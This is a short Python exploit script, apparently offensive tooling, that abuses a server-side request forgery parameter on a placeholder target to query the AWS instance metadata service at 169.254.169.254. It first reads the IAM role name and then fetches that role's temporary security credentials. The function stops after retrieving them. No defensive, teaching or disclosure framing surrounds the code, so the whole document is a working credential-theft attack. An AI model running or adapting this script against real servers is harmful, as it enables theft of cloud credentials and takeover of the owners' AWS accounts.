# AWS IMDSv1 Credentials via SSRF
# Ziel: http://vulnerable.example/fetch?url=http://169.254.169.254/latest/meta-data/
import requests

def ssrf_aws(target_url, ssrf_param="url"):
    meta = requests.get(target_url, params={ssrf_param: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}).text
    role = meta.strip()
    creds = requests.get(target_url, params={ssrf_param: f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}"}).json()
